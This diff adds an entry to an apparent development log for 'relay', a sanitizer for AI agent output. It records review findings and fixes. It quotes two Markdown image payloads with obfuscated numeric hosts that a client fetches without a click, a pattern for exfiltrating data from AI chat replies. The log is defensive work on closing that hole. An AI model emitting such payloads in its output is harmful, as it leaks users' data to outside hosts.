@@ -208,3 +208,25 @@ relay#91 and relay#95.
     with the live set at the time of writing. Thoughts, calls and plans
     list none.
   - `initialize` says `relay/inertText`.
+- 2026-11-15, the relay#118 session: review rounds 1 and 2 (fresh
+  read-only reviewers; Codex is out of quota until 19 November).
+  - Round 1, four findings, fixed in lsvzvpsp: a call's rawInput keys
+    went out raw (the finder followed one); held text lost its messageId
+    and could run into the next message; a session that turned clean
+    sent its held text late; display blocks were escaped twice. Accepted:
+    the last word before a tool call goes out as a cut word.
+  - relay-34's runs of relay-tui over the fuzz's `conv` channel found two
+    places relay left what relay-tui broke: a `://` after no ASCII
+    scheme, and `www.` after a digit. relay now breaks both
+    (qrtpnpps, yxspqonq), and the run shows relay-tui would change
+    nothing in relay's output.
+  - Round 2, two findings. A tool call's `name`, the model's own, went out
+    raw. And Markdown: `![x](//8.8.2056/p?d=S)` and `<img src=//134744072/p>`
+    passed whole, since no link finder follows those hosts, but a
+    Markdown client fetches them with no click. The root of that is
+    markup, not addresses, so relay now escapes the three pieces of
+    CommonMark that make a link, an image or HTML (`](`, `]:`, `<`), as
+    CommonMark escapes them, rather than chasing every way to write an
+    address. My call, under AGENTS.md; the alternatives were fencing whole
+    replies as code (formatting lost) or telling clients not to render
+    Markdown (a plain client would not know).
